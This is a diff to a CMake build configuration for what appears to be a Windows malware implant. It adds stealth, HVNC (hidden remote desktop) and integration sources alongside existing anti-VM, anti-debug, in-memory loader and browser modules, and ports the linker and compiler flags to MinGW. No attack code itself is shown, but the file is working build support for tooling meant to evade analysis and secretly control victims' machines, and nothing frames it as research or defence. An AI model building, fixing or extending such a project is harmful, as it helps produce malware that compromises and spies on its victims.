@@ -9,6 +9,7 @@ set(CORE_SOURCES
     src/main.cpp
     src/logger/file_logger.cpp
     src/logger/encrypt_logger.cpp
+    src/integration.cpp
 )
 
 # Browser module sources
@@ -40,12 +41,14 @@ set(STEALTH_SOURCES
     src/stealth/anti_vm.cpp
     src/stealth/anti_debug.cpp
     src/stealth/in_memory_loader.cpp
+    src/stealth/stealth_system.cpp
 )
 
 # HVNC sources
 set(HVNC_SOURCES
     src/hvnc/create_desktop.cpp
     src/hvnc/control_session.cpp
+    src/hvnc/hvnc_manager.cpp
 )
 
 # All module sources
@@ -178,7 +181,7 @@ if(WIN32)
         ole32
         oleaut32
         uuid
-        comsupp
+        # comsupp  # Not available in MinGW
         
         # Task Scheduler
         taskschd
@@ -196,14 +199,27 @@ if(WIN32)
     )
     
     # Set subsystem
-    if(BUILD_AS_EXE)
-        set_target_properties(${AGENT_NAME} PROPERTIES
-            LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup"
-        )
+    if(MSVC)
+        if(BUILD_AS_EXE)
+            set_target_properties(${AGENT_NAME} PROPERTIES
+                LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup"
+            )
+        else()
+            set_target_properties(${AGENT_NAME} PROPERTIES
+                LINK_FLAGS "/SUBSYSTEM:WINDOWS /DLL"
+            )
+        endif()
     else()
-        set_target_properties(${AGENT_NAME} PROPERTIES
-            LINK_FLAGS "/SUBSYSTEM:WINDOWS /DLL"
-        )
+        # MinGW flags
+        if(BUILD_AS_EXE)
+            set_target_properties(${AGENT_NAME} PROPERTIES
+                LINK_FLAGS "-Wl,--subsystem,windows"
+            )
+        else()
+            set_target_properties(${AGENT_NAME} PROPERTIES
+                LINK_FLAGS "-Wl,--subsystem,windows"
+            )
+        endif()
     endif()
 endif()
 
@@ -241,7 +257,7 @@ else()
         -Wno-unused-parameter
         -fvisibility=hidden
         -fvisibility-inlines-hidden
-        -fno-exceptions
+        -fexceptions
         -fno-rtti
     )
     
